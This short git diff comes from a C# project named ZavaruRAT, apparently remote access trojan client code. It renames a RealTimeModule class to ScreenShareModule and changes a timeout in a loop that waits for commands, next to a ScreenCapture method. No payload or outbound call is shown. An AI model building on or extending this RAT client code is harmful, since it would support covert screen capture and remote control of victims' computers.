@@ -10,7 +10,7 @@ using ZavaruRAT.Shared.Models.Client;
 
 namespace ZavaruRAT.Client.Modules;
 
-public sealed class RealTimeModule : ModuleBase
+public sealed class ScreenShareModule : ModuleBase
 {
     public async Task<RealTimeExecutionResult> ScreenCapture()
     {
@@ -34,7 +34,7 @@ public sealed class RealTimeModule : ModuleBase
 
             try
             {
-                _ = await Context.Client.ReceiveAsync<Command>(10);
+                _ = await Context.Client.ReceiveAsync<Command>(50);
                 break;
             }
             catch
